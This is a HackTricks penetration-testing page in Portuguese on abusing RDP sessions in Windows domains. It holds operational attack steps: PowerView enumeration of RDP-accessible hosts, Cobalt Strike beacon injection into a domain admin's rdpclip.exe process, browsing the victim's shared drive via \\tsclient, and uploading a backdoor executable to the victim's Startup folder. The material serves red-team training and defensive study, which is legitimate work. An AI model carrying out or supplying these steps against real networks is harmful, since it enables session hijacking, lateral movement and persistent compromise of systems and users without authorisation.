# Abuso de Sessões RDP

{{#include ../../banners/hacktricks-training.md}}

## Injeção de Processo RDP

Se o **grupo externo** tiver **acesso RDP** a qualquer **computador** no domínio atual, um **atacante** pode **comprometer esse computador e esperar por ele**.

Uma vez que esse usuário tenha acessado via RDP, o **atacante pode pivotar para a sessão desse usuário** e abusar de suas permissões no domínio externo.
```powershell
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Verifique **outras maneiras de roubar sessões com outras ferramentas** [**nesta página.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Se um usuário acessar via **RDP em uma máquina** onde um **atacante** está **aguardando** por ele, o atacante poderá **injetar um beacon na sessão RDP do usuário** e se a **vítima montou seu drive** ao acessar via RDP, o **atacante poderia acessá-lo**.

Nesse caso, você poderia apenas **comprometer** o **computador original** da **vítima** escrevendo um **backdoor** na **pasta de inicialização**.
```powershell
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
{{#include ../../banners/hacktricks-training.md}}
